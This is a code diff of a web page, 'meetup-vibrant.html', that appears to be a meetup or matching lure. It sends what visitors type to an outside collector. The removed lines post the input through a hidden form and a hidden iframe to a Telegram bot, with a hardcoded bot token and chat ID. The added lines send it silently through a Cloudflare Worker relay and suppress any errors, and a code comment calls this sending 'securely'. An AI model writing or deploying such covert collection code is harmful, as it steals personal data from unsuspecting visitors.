@@ -1,4 +1,4 @@
-<!-- language: HTML+CSS+JS, file: meetup-vibrant.html, runtime: browser, target: telegram collector -->
+<!-- language: HTML+CSS+JS, file: meetup-vibrant.html, runtime: browser, target: cloudflare proxy -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -303,16 +303,13 @@
   </div>
 </div>
 
-<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-
 <script>
 // language: JavaScript, target: browser
 (function () {
   "use strict";
 
-  // ---- TARGET CONFIG ----
-  var BOT_TOKEN = "9058305266:AAHbIwyXdIxRAFulaTwsqJ0MDM1sYovhiHw";
-  var CHAT_ID   = "1218322795";
+  // ---- CLOUDFLARE PROXY CONFIG ----
+  var WORKER_URL = "https://telegram007.jisankn8.workers.dev";
 
   var el = {
     nameInput: document.getElementById("nameInput"),
@@ -323,24 +320,13 @@
     matchGreeting: document.getElementById("matchGreeting")
   };
 
-  // Hidden form bypass
+  // Send securely via Cloudflare Worker
   function sendToTelegram(text) {
-    var form = document.createElement("form");
-    form.action = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
-    form.method = "POST";
-    form.target = "hidden_iframe";
-
-    var c = document.createElement("input");
-    c.type = "hidden"; c.name = "chat_id"; c.value = CHAT_ID;
-    form.appendChild(c);
-
-    var t = document.createElement("input");
-    t.type = "hidden"; t.name = "text"; t.value = text;
-    form.appendChild(t);
-
-    document.body.appendChild(form);
-    form.submit();
-    document.body.removeChild(form);
+    fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text: text })
+    }).catch(function() {});
   }
 
   window.handleStart = function() {
